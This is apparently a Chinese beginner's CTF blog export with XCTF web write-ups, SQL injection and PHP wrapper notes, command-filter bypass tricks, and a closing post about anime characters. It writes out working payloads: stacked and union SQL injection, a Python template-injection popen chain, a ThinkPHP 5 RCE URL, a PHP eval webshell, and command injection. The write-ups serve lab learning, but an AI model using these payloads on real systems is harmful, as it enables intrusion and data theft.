1,2`回显正则过滤![image-20201012211153568](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201012211153568.png)\n\n没有过滤`rename`和`alter`可以尝试堆叠注入（当然，我肯定是想不到滴)<img src=\"http://cdn.jsdelivr.net/gh/overnight-miss-you/test/02ADE2EA.jpg\" style=\"zoom:25%;\" />\n\n接着使用堆叠判断数据库名`1';show databases;#`查看所有数据库有回显可以注入。\n\n<img src=\"http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201012212111844.png\" alt=\"image-20201012212111844\" style=\"zoom:80%;\" />\n\n接着查看所有的表`1';show tabales;#`回显了所有的表。\n\n![image-20201012212604708](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201012212604708.png)\n\n查看两个表里得数据`0';show columns from words;#`\n\n<img src=\"http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201012213207735.png\" alt=\"image-20201012213207735\" style=\"zoom:80%;\" />\n\n`0'; show columns from `1919810931114514`;#`\n\n![image-20201012214238170](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201012214238170.png)\n\n发现flag。但`1' or 1=1#`只能打开words里的内容；开始使用骚操作。（肯定，这我还是想不出来嘀)<img src=\"http://cdn.jsdelivr.net/gh/overnight-miss-you/test/02C8EA49.jpg\" alt=\"img\" style=\"zoom: 25%;\" />\n\n把words改成随便其他的，把1919810931114514改名为words，并且把新words(原1919810931114514)里添加一列id;\n\n再把flag列改成data,====这样以后，系统默认输出的内容就是flag里的内容了。\n\n代码：\n```\n1';rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100);#\n```\n\n\n出现一条分界线表示执行成功，执行`1' or 1=1#`输出flag。\n\n还有两种相似方法：\n\n```\n1';HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;#\n\n1';HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;#\n```\n\n**`HANDLER ... OPEN`语句打开一个表，使其可以使用后续`HANDLER ... READ`语句访问，该表对象未被其他会话共享，并且在会话调用`HANDLER ... CLOSE`或会话终止之前不会关闭**\n\n\n\n#### ！！！！这次的菜鸡博客就到这吧，我要去吃饭，睡觉，打六花了！！！\n\n![inhhdex](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/inhhdex.jpg)\n\n![timsdsg](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/timsdsg.gif)"},{"title":"整.符.错.注入","url":"/2020/10/10/8-9/","content":"## 垃圾博客第六淡\n\n看着wp总结一下SQL注入的种种的判断方法和大概的解题方法。。\n\n#### 先简单的说一下SQL数据库\n\nMySQL默认有“information_schema”的数据库，该库中有三个表名\n\n1、SCHEMATA：存储该用户创建的所有数据库的库名，记录库名的字段为SCHEMA_NAME。\n\n 2、TABLES：存储该用户创建的所有数据库的库名的字段（table_schema）和表名字段（table_name）。\n\n 3、COLUMNS：存储该用户创建的所有数据库的库名（table_schema）  表名（table_name）和字段名（columns_name）。\n\n##### 整数型注入\n\nunion操作符将两个SQL查询语句连接了起来，当设置id参数为-1时，由于没有id=-1的数据，因此会返回union后的查询语句的结果。\n\n通常的判断方法：\n\n输入`1`，执行成功。   输入`1 and 1=1`，执行成功。 输入`1 and 1=2`执行失败。 推断为整数型注入\n\n接着通过`1 order by 1`,`1 order by 2`,`1 order by 3`,来判断字段数。\n\n爆破数据库：`-1 union select 1,database()`   以`sqli`为例\n\n爆破sqli中的表名：`-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'` \n\n最后读取flag：`-1 union select 1 group_concat(flag)from sqli.flag`\n\n##### 字符型注入\n\n输入`1`，执行成功。   输入`1 and 1=1`，执行成功。 输入`1 and 1=2`执行成功。不是整数型注入 \n\n考虑是否为字符型注入执行`'union select 1,database() -- '`爆破出数据库sqli\n\n爆破其他的文件代码与上面的相似，不过在代码前加`'`，在代码的最后加` --'`。\n\n在没有回显的情况下可以使用抓包来爆破。\n\n爆破数据库名：`id=1' and substr(database(),1,1)='a'--+`,在`a`这里进行爆破第一个字母  后续一样\n\n爆破数据表名：`id=1' and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='a'--+`,在`a`这里进行爆破第一个字母  后续一样，修改limit 0,1为limit 1,1，可以得到第二个表名，以此类推。\n\n##### 报错注入\n\n题如其名：当输入的代码出现错误时，程序直接将错误信息输出到页面上。\n\n爆破数据库：`1 union select updatexml(1,concat(0x7e,database(),0x7e),1);`,\n\n这句也行： `1 Union select count(*),concat(database(),0x26,floor(rand(0)*2))x from information_schema.columns group by x;`\n\n爆破数据表明：`1 union select updatexml(1,concat(0x7e,  (select(group_concat(table_name))from information_schema.tables where  table_schema=\"sqli\") ,0x7e),1);`\n\n这句也行：`1 Union select count(*),concat((select table_name from information_schema.tables where table_schema='sqli' limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x`不过这`limit 0,1)`要改为`limit 1,1)`\n\n！！（0,1）表示输出第一个，（0，2）表示一次输出两个。\n\n贴心的贴贴：updatexml()函数\n\nUPDATEXML (XML_document, XPath_string, new_value); \n 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc \n 第二个参数：XPath_string (Xpath格式的字符串) 。[细节的Xpath](https://www.runoob.com/xpath/xpath-tutorial.html)\n 第三个参数：new_value，String格式，替换查找到的符合条件的数据 \n 作用：改变文档中符合条件的节点的值\n\n#### ！！！！这次的水博客就到这了，又加一位老婆，我得去吃牢房了！！！\n\n![111](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/111.jpg)\n\n![asdtimg](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/asdtimg.gif)"},{"title":"攻防世界进阶1-6","url":"/2020/10/08/jinjie/","content":"## 垃圾博客第五氮\n\n废物的我在攻防世界看着wp刷题。。\n\n##### 1==baby_web       \n\n打开提示   初始页是啥：：\n\n输入index.php，发现马上跳了回来  `F12`  \n\n![image-20201008103322144](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201008103322144.png)\n\n##### 2==Training-WWW-Robots        \n\n打开，根据题目头，访问`robots.txt`发现`fa0g.php`直接打开得到flag;\n\n  *robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。*\n\n##### 3==unserialize3\n\n打开链接  \n\n![image-20201010170348551](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201010170348551.png)\n\n所以我们需要绕过  __wakeup()\n\n```php\n<?php\nclass xctf{ //类\npublic $flag = '111';//public定义flag变量公开可见\npublic function __wakeup(){\nexit('bad requests');\n}\n}//少了一个}\n$a=new xctf();\necho(serialize($a));////改变属性绕过wake up 函数\n?>\n```\n\n跑处的代码为`O:4:\"xctf\":1:{s:4:\"flag\";s:3:\"111\";}`\n\n利用__wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行\n\n所以把`:1:`跟换成`:2:`即可让过__wakeup()函数\n\n输入\n\n##### 4==Web_python_template_injection\n\n打开，提示python模板注入，通过python的对象的继承来一步步实现文件读取和命令执行的的。所要执行的代码要被`{}`包括。\n\n首先 随便输入看代码是否会被执行\n\n![image-20201008133939744](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201008133939744.png)\n\n输入的1+1被计算为2 。所以`{}`中的代码会被计算。接下来我们要通过注入代码来查找flag。\n\n![image-20201008134354381](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201008134354381.png)\n\n接下来的我也看不懂。。不公通用代码放这，以及[大佬的细节解释](https://www.freebuf.com/column/187845.html)；\n\n类似的pyon模板注入的题通用的命令：`{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen(\"要执行的语句\").read()}}`\n\n![image-20201008135802719](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201008135802719.png)\n\n##### 5==Web_php_unserialize\n\n打开，看到一段代码。。![img](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/0137C50C.jpg)。。。看不懂。。接下来是大佬的解释。\n\n\n\n```php\n<?php \nclass Demo { \n    private $file = 'index.php';\n    public function __construct($file) { \n        $this->file = $file; \n    }\n    function __destruct() { \n        echo @highlight_file($this->file, true); \n    }\n    function __wakeup() { //把file变量强行赋值为index.php\n        if ($this->file != 'index.php') { \n            //the secret is in the fl4g.php\n            $this->file = 'index.php'; \n        } \n    } \n}\nif (isset($_GET['var'])) { //判断var变量是否存在并且非NULL\n    $var = base64_decode($_GET['var']); //bse64解密var\n    if (preg_match('/[oc]:\\d+:/i', $var)) { //正则匹配$var出现(O:数字或者C:数字这样的形式)就直接退出。\n        die('stop hacking!'); //停止脚本并输出stop hacking!\n    } else {\n        @unserialize($var); //反序列化$var\n    } \n} else { \n    highlight_file(\"index.php\"); //对index.php进行语法高亮显示\n} \n?>\n```\n\n```php\n$A = new Demo ('fl4g.php');\n$C = serialize($A);                     //改变属性绕过wake up 函数\n$C = str_replace('O:4','O:+4',$C);      //绕过正则表达式过滤(把0:4换成0;+4)\n$C = str_replace(':1:',':2:',$C);     // 个数的值大于真实个数的属性时就会跳过wakeup的执行\nvar_dump($C);\nvar_dump(base64_encode($C));            //base64加密\n```\n\n最后输入`var=...(跑出的代码)`得到flag。\n\n没看懂的也可以观看这个----->>[大佬笔记](https://www.guildhab.top/?p=990)\n\n##### 6==php_rce\n\n使用的是ThinkPHP v5的rce漏洞\n\n直接使用`?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls`\n\n![image-20201008151703541](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201008151703541.png)\n\n并没有发现flag。查找flag..\n\n`?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find / -name \"flag*\"`\n\n![image-20201008152335242](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201008152335242.png)\n\n或者`?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls /`\n\n![image-20201008152845130](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201008152845130.png)\n\n打开flag文件，得到flag。\n\n`?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag`\n\n##### 7==Web_php_include\n\n又是一段代码，还好不是很复杂。。\n\n![image-20201008154232747](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201008154232747.png)\n\n构造php://input时要注意使用PHP，不然会被替换掉。。。  `F12`使用Max HackBar\n\n![image-20201008154531513](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201008154531513.png)\n\n或者使用burpsuite抓包  改包也可以。\n\n![image-20201008160756756](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201008160756756.png)\n\n或者使用`data`协议，输入`data: text/plain,<?php system(\"ls\"); ?>`\n\n![image-20201008162455141](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201008162455141.png)\n\n#### ！！!这次的菜鸡博客就到这里了，加藤 惠喊我回去睡觉了。！！！(づ｡◕ᴗᴗ◕｡)づ\n\n<img src=\"https://cdn.jsdelivr.net/gh/overnight-miss-you/test/timasag.gif\" style=\"zoom:120%;\" />"},{"title":"攻防世界入门","url":"/2020/10/07/himBHs-a/","content":"## 垃圾博客第四\n\n菜鸡的我在攻防世界看着wp刷题。。\n\n##### 1==查看源代码       右键查看源代码和在网址前加`view-source:`\n\n##### 2==get   post      php默认的是get请求    post请求可以抓包修改或者使用插件《Max HackBar》\n\n##### 3==robots     robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。可以使用直接访问robots.txt或者使用dirsearch扫目录  ....`**python dirsearch.py -u** **网址 -e \\*  （目录扫描） -s 1 加这个会仔细一点**`\n\n##### 4==backup       php的默认备份文件为index.php.bak。。直接打开即可\n\n##### 5==cookie    先查看cookie.php,在网络中查看cookie中的flag.\n\n![image-20201007203306377](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201007203306377.png)\n\n​    或者使用抓包软件burosuite来抓包。\n\n![image-20201007204134270](https:/cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201007204134270.png)\n\n##### 6==disabled_button    打开后是一个不能按的按钮：F12查看css发现\n\n![image-20201007205327194](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201007205327194.png)\n\n直接把disabled删除。在点击按钮即可。\n\n![image-20201007210324451](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201007210324451.png)\n\n##### 7==weak_auth      随便输入用户和密码   弹窗发现用户名是admin，抓包爆破密码。\n\n![image-20201007211844844](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201007211844844.png)\n\n![image-20201007211645390](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201007211645390.png)\n\n爆破成功 得到密码 ；\n\n![image-20201007212006234](https:/cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201007212006234.png)\n\n登录得到flag。\n\n##### 8==command_execution     进入后发现一个ping\n\n![image-20201007213738234](https:/cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201007213738234.png)\n\n先尝试 `127.0.0.1` ,发现ping通  在尝试用`&&`来执行多个命令:输入`127.0.0.1&&ls`\n\n![image-20201007214228844](https:/cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201007214228844.png)\n\n发现可以多个命令执行  输入`127.0.0.1&&fing -name\"flag\"`来查找flag  \n\n![image-20201007214516223](https:/cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201007214516223.png)\n\n`cat` 打开flag，即可。\n\n##### 9==simple_php   \n\n```HTML\n﻿<?php\nshow_source(__FILE__);\ninclude(\"config.php\");\n$a=@$_GET['a'];\n$b=@$_GET['b'];\nif($a==0 and $a){\n    echo $flag1;\n}\nif(is_numeric($b)){\n    exit();\n}\nif($b>1234){\n    echo $flag2;\n}\n?> \n```\n\n 如果$a等于0 and $a，输出$flag1\n 如果$b是<u>数字或者字符串</u>那么退出当前脚本\n 如果$b>1234，输出$flag2\n 所以，这里我们既要保证输出$a，$b，又要保证$b是数字\n\n```php\n字符串和数字比较使用==时,字符串会先转换为数字类型再比较\nvar_dump('a' == 0);//true，此时a字符串类型转化成数字，因为a字符串开头中没有找到数字，所以转换为0\nvar_dump('123a' == 123);//true，这里'123a'会被转换为123\n```\n\n所以输出 `a==0&&b=2222a`可行  输出`a=b&&b=2344c`已可行。\n\n##### 10==xff_referer    \n\n![image-20201007220220898](https:/cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201007220220898.png)\n\nxff 是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址\n\nreferer 是http的拓展头部，作用是记录当前请求页面的来源页面的地址\n\n既然要伪造，先抓个包先。修改xff后\n\n![image-20201007221528866](https:/cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201007221528866.png)\n\n伪造Referer:\n\n![image-20201007221652543](https:/cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201007221652543.png)\n\n得到flag。\n\n##### 11==webshell    这里用上了一句话木马\n\n```\n  <?php @eval($_POST['shell']);?>  \n```\n\n直接蚁剑连接就行\n\n![image-20201007224217080](https:/cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201007224217080.png)\n\n![image-20201007224251859](https:/cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201007224251859.png)\n\n得到flag。===*一句话木马以后会常用  以及类似的图片码。这里不过多解释。*\n\n##### 12==simple_js     打开  \n\n ![image-20201007230753092](https:/cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201007230753092.png)\n\n![image-20201007230405454](https:/cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201007230405454.png)\n\n提交Cyberpeace{70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65}无效\n\n使用python转码。\n\n```python\nb=[70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65]\nfor i in b:\n    print(chr(i),end='')\n```\n\nASCII码转换为字符串为：：FAUX PASSWORD HAHA...没有啥子用\n\n`\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30`使用 16进制转文本后为55,56,54,79,115,69,114,116,107,49,50\n\n提交Cyberpeace{55,56,54,79,115,69,114,116,107,49,50}无效\n\n再次转码\n\n```python\nb=[55,56,54,79,115,69,114,116,107,49,50]\nfor i in b:\n    print(chr(i),end='')\n```\n\nASCII码转换为字符串为：：786OsErtk12\n\n提交Cyberpeace{786OsErtk12}成功！！\n\n##### ！！！这次的垃圾博客就到这了，我要边听麻衣学姐洗澡的声音边吃三碗饭去了！！！─=≡Σ(((つ•̀ω•́)つ\n\n![timg](https:/cdn.jsdelivr.net/gh/overnight-miss-you/test/timg.gif)"},{"title":"字符过滤","url":"/2020/10/06/Characters of the filter/","content":"## 垃圾博客第二弹：\n\n简单的说一下，菜鸡的我混进大佬群的学习情况；\n\n#### 面对一些过滤题，我们可以使用一些简单的绕过方式：\n\n##### 如：过滤了`cat`我们可以使用与它类似的代码`tail`,`tac`,`nl`,`more less`,`od`\n\n`tac`与`cat`相反。是从尾到头列出查找的内容；\n\n`nl`是把文本加行号再标准输出；\n\n`more`将文本以一页一页的形式显示；（一般*space*显示下一页，不能显示上一页）\n\n`less`与`more`类似不过`less`为随意浏览，一般*space*显示下一页，`b`显示上一页）\n\n`od`以进制数的形式输出文本;   `-d`十进制；`-o`八进制（默认）；`-x`十六进制；`-c`ASCLL字符型\n\n#### 或者我们可以通过符号来进行绕过；\n\n##### 如：过滤了`cat`,`flag`,`php`,等重要命令时；\n\n我们可以使用符号来进行绕过：\n\n如：过滤cat时`c\\a\\t`,`c\"a\"t`,`c'a't`,\n\n过滤flag或php时`f\\lag.php`,`f'l'ag.php`,`fl??.php`.  `fla??php`,`f*`等。。  *<u>?<=>表示一个任意的一个字符</u>*       <u>（`*`表示的是自动补全后面的）</u>\n\n##### 当过滤了执行命令`system`时\n\n我们可以用 `passthur()`,`exec()`,`popen()`,代替。\n\n`passthru`直接将结果输出，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/20201004183355.png)\n\nexec ()函数与system()类似，也执行给定的命令，但不输出结果，而是返回结果的**最后一行**。如果要是输出多条；则需要在后面加参数`array`（不过我现在还不会用）\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/20201004183126.png)\n\npopen函数不会直接返回执行结果，而是返回一个文件指针，但命令已经执行。如果要输出文件指针，需要加`fread``。\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/20201004190756.png)\n\n如果只是输出了一部分，可能是 300 不够 ，把300加大就行。\n\n##### 当一些重要的符号被过滤时\n\n如` `（空格）被过滤时;我们可以使用：`%09(tab)`,`$IFS$9`,`${IFS}`,`<(不太管用)`，`<>`,`%20`来代替` `\n\n`;`被过滤时，我们可以使用`?>`来代替\n\n​\t`()`被过滤时，php中不用括号的有 `echo`,和`include`等\n\n​         `echo`是用于字符串的输出;\n\n![image-20201005131720796](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201005131720796.png)\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/20201005132452.png)\n\n或者使用`include`通过$_POST[1]来获取数据，但include包含的php文件不会在页面显示，所以需要使用伪协议。*<u>这里使用的是php://filter伪协议</u>*\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/20201005154013.png)\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/20201005154118.png)\n\n不过最后输出的是base64加密的形式输出的，在网页上解密即可。\n\n\n\n#### ！！！这篇垃圾博客就到这了，02叫我回家吃饭了。！！\n\n<img src=\"https://cdn.jsdelivr.net/gh/overnight-miss-you/test/QQ图片20201006210944.gif\" style=\"zoom:67%;\" />"},{"title":"三种伪协议","url":"/2020/10/06/php-input/","content":"## 垃圾博客第三弹\n\n前一弹，我们题到了*伪协议*\n\n这一蛋。我们就简单的讲解一些PHP中常用的三种伪协议`php://input`,`php://filter`,`php://data`\n\n（主要是博主太垃圾了  NB一点的我也不会.......）\n\n##### `php://input` 是个可以访问请求的原始数据的只读流。    POST 请求的情况下，最好使用 php://input，因为它不依赖于特定的 php.ini 指令。\n\n使用`php://input`协议需要条件：\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/20201006203858.png)\n\n使用如下：：可以通过! burpsuite !抓包，修改数据来进行读取数据包。\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/20201006193113.png)\n\n也可以通过! Max HackBar !插件直接访问。\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/20201006193345.png)\n\n##### `php://filter`是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取。\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/20201006195207.png)\n\n使用`base64`来读取数据的方法在[第一弹最后已经说过](https://overnight-miss-you.github.io/2020/10/04/Characters%20of%20the%20filter/)，在这不在复述。\n\n`php://filter`字符串处理方法来除去`exit`。\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/20201006200426.png)\n\n！！`<?php exet;?>`是一个XML标签，我们可以通过`strip_tags`函数过滤它。\n\n不过.。![img](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/19E64C43.jpg)我还不会以这个，先把代码放着:`php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php`。（看着和前面的有点像）。\n\n##### 最后就是`data`使用条件和`php://input`一样\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/20200728205328780.PNG)\n\n并且`data`可以直接写入代码，形式如下：\n\n`data: text/plain,<?php 执行内容 ?>`,\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/20201006205231.png)\n\n使用base64编码。。（红色划线部分为`<?php system('cat flag.php');?>`的base64加密）\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/20201006204416.png)\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/20201006205504.png)\n\n`data:text/plain;base64,执行的代码（base64加密）`==可以绕过一些过滤；。\n\n\n#### ！！！这次的垃圾博客就到这了，<font color=#\\#66CCFF size>蕾姆</font>叫我去睡觉了！！\n\n<img src=\"https://cdn.jsdelivr.net/gh/overnight-miss-you/test/4dee2d4f78f0f736804edf150555b319eac413f8.gif\" style=\"zoom: 80%;\" />"},{"title":"亲爱的老婆们","url":"/2020/10/03/wife/","content":"# 我的第一次博客。\n\n也没啥好写的，简单的介绍一下我的老婆们吧\n\n### 第一位   02    《DARLING in the FRANXX》女主   非人类   \n\n ！！：但丝毫不影响她成为我老婆！！\n\n<img src=\"https://cdn.jsdelivr.net/gh/overnight-miss-you/test/B450BD5B570EB9EB3396888254512747.jpg\" style=\"zoom: 33%;\" />\n\n！！我个人最喜欢的图，隔着图片我都能感觉到我老婆的开心。。！！\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/02.jpg)\n\n### 第二位   蕾姆  《Re：从零开始的异世界生活》\n\n！！如果真爱一定有颜色，那一定是<font color=#\\#66CCFF size>蓝色</font>的，！！\n\n<img src=\"https://cdn.jsdelivr.net/gh/overnight-miss-you/test/F3448B48BF2D1D224A3897F896CAF896.jpg\" style=\"zoom:80%;\" />\n\n！！！蕾姆的爱，是其他老婆都不上的。！！\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/u%253D2024308495%252C2443360258%2526fm%253D26%2526gp%253D0.jpg)\n\n！！！--当然，像我这么好的人 ，当然是一锅端的啊！！\n\n### 拉姆\n\n<img src=\"https://cdn.jsdelivr.net/gh/overnight-miss-you/test/57711035_p0_master1200.jpg\" style=\"zoom:130%;\" />\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/56596870_p0_master1200.jpg)\n\n### 爱蜜莉雅糖\n\n<img src=\"https://cdn.jsdelivr.net/gh/overnight-miss-you/test/58133782_p0_master1200.jpg\" style=\"zoom:130%;\" />\n\n### 第三位     麻衣学姐   《青春猪头少年系列》\n\n！！人活着，为的就是麻衣学姐！！\n\n<img src=\"https://cdn.jsdelivr.net/gh/overnight-miss-you/test/u%253D3322358111%252C28374637%2526fm%253D26%2526gp%253D0.jpg\" style=\"zoom:129%;\" />\n\n！！：梓川咲太--可是我师父！！\n\n不过！！咲太师傅的徒弟有那个不是==嘴上喊着师傅，心里惦记师娘的！！==\n\n<img src=\"https://cdn.jsdelivr.net/gh/overnight-miss-you/test/u%253D3559152491%252C2397488672%2526fm%253D26%2526gp%253D0.jpg\" style=\"zoom:;\" />\n\n### 第四位    加藤 恵    《路人女主的养成方法》\n\n！！先有圣人后有天，吾惠美如画中仙。！！\n\n<img src=\"https://cdn.jsdelivr.net/gh/overnight-miss-you/test/E485FAB40E237AC0EF2ABA70A588EC68.jpg\" style=\"zoom: 33%;\" />\n\n！！当然 ，那些附带的小老婆们。我怎么会抛弃呢！！\n\n###  泽村・スペンサー・英梨々（泽村·史宾瑟·英梨梨）\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/58777097_p0_master1200.jpg)\n\n### 霞ヶ丘 诗羽 （霞之丘诗羽）\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/60073240_p0_master1200.jpg)\n\n以及她们的合照！！\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/55176137_p0_master1200.jpg)\n\n### 第五位   雪之下雪乃 《我的青春恋爱物语果然有问题》\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/u%253D4274170206%252C2211927177%2526fm%253D26%2526gp%253D0.jpg)\n\n！！！想屁吃，我老婆的秘密是不可能告诉你的。！！\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/u%253D729850800%252C3259256989%2526fm%253D26%2526gp%253D0.jpg)\n\n！！当然这里面的--大老师会教会你青春期的处事之道。！！\n\n### 第六位   时崎狂三 《约会大作战》\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/u%253D2220594314%252C1874710572%2526fm%253D26%2526gp%253D0.jpg)\n\n！！成也城哥，败也城哥。！！\n\n![](https://cdn.jsdelivr.net/gh/overnight-miss-you/test/u%253D78230359%252C1155115830%2526fm%253D26%2526gp%253D0.jpg)\n\n！！！！！！哎呀！  老婆太多有点数不过来了==！！\n\n====不写了，不写了。老婆们叫我回家吃饭了o(*////▽////*)q"}]